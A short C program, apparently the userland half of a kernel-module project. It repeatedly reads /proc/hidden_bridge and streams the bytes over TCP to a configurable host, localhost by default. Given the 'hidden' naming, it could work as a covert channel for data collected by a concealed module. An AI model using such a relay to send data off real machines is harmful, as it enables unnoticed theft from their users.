#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <arpa/inet.h>

#define PROC_FILE "/proc/hidden_bridge"
#define BUF_SIZE 1024

int main(int argc, char *argv[])
{
    char buffer[BUF_SIZE]; // To store the text we get from kernel
    int fd; // Will hold the id number Linux gives us when we open the file
    int bytes_read; // How many bytes the kernel gave

    char *target_ip = (char *)"127.0.0.1"; // Default ip
    int target_port = 9021; // Default port

    for (int i = 1; i < argc; i++)
    {
        if (strcmp(argv[i], "-ip") == 0)
        {
            target_ip = argv[i + 1];
            i++;
        }
        else if (strcmp(argv[i], "-port") == 0)
        {
            target_port = atoi(argv[i + 1]);
            i++;
        }
    }

    int sock;
    struct sockaddr_in serv_addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        perror("socket");
        return 1;
    }

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(target_port);

    if (inet_pton(AF_INET, target_ip, &serv_addr.sin_addr) <= 0)
    {
        perror("inet_pton");
        close(sock);
        return 1;
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        perror("connect");
        close(sock);
        return 1;
    }

    // Read from /proc and send to server
    while (1)
    {
        fd = open(PROC_FILE, O_RDONLY); // Open /proc/hidden_bridge for reading
        if (fd < 0)
        {
            perror("open");
            continue;
        }

        memset(buffer, 0, sizeof(buffer));

        bytes_read = read(fd, buffer, sizeof(buffer) - 1); // -1 because \0
        if (bytes_read < 0)
        {
            perror("read");
            close(fd);
            continue;
        }

        if (bytes_read > 0) // We got data
        {
            send(sock, buffer, bytes_read, 0); // Send the raw bytes to the server
        }

        close(fd);
        usleep(500000); // 500ms to not hammer /proc
    }

    close(sock);
    return 0;
}